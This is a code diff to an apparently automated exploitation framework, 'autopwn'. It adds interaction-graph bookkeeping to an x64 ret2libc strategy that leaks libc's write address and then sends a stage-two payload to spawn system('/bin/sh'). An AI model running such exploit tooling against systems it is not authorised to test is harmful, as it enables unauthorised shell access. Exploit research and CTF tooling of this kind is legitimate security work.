@@ -31,7 +31,7 @@ from __future__ import annotations
 
 import datetime
 
-from autopwn.context import ExploitContext
+from autopwn.context import ExploitContext, InteractionGraph, InteractionKind
 from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
 from autopwn.exp.base import ExploitStrategy
 from autopwn.exp.priorities import RET2LIBC_WRITE
@@ -80,6 +80,7 @@ class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
 
         print_section_header("EXPLOITATION: ret2libc (write) - x64")
         print_payload("preparing ret2libc exploit using write function")
+        graph = _bind_interaction_graph(ctx)
 
         primitive = Ret2LibcWriteX64()
 
@@ -104,6 +105,12 @@ class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
         except Exception as e:
             print_info(f"ret2libc-write-x64 leak parse failed: {e}")
             return False
+        ctx.set_runtime_fact(
+            "libc.write_addr",
+            write_addr,
+            source="strategy.ret2libc_write_x64",
+        )
+        graph.record_event("leak_write", f"write=0x{write_addr:x}")
         print_success(f"write address leaked: {hex(write_addr)}")
 
         # Stage 2: return-to-system.
@@ -113,6 +120,7 @@ class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
             return False
 
         io.sendline(payload2)
+        graph.record_event("spawn_shell", "stage2 system('/bin/sh')")
         print_payload("stage 2: executing system('/bin/sh')")
 
         info = ExploitInfo(
@@ -130,6 +138,7 @@ class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
 
 
         verify_ok, verify_output = verify_shell(io, keep_alive=True)
+        graph.record_event("verify_shell", verify_output.strip() if verify_ok else "verify failed")
         from autopwn.core.shell_verify import record_success_verified
         ok = record_success_verified(info, verify_ok, verify_output, ctx)
         if not ok:
@@ -236,3 +245,23 @@ __all__ = [
     "Ret2LibcWriteX64LocalStrategy",
     "Ret2LibcWriteX64RemoteStrategy",
 ]
+
+
+def _bind_interaction_graph(ctx: ExploitContext) -> InteractionGraph:
+    graph = InteractionGraph(name="ret2libc-write-x64")
+    graph.add_step("leak_write", InteractionKind.LEAK, produces=("libc.write_addr",))
+    graph.add_step(
+        "spawn_shell",
+        InteractionKind.EXECUTE,
+        requires=("libc.write_addr",),
+        notes="stage-2 ret2libc system('/bin/sh')",
+    )
+    graph.add_step("verify_shell", InteractionKind.VERIFY)
+    graph.connect("leak_write", "spawn_shell", reason="need leaked libc write address")
+    graph.connect("spawn_shell", "verify_shell", reason="verify shell after stage 2")
+    ctx.set_interaction_graph(
+        graph,
+        scope=ctx.runtime_fact_scope,
+        source="strategy.ret2libc_write_x64",
+    )
+    return graph
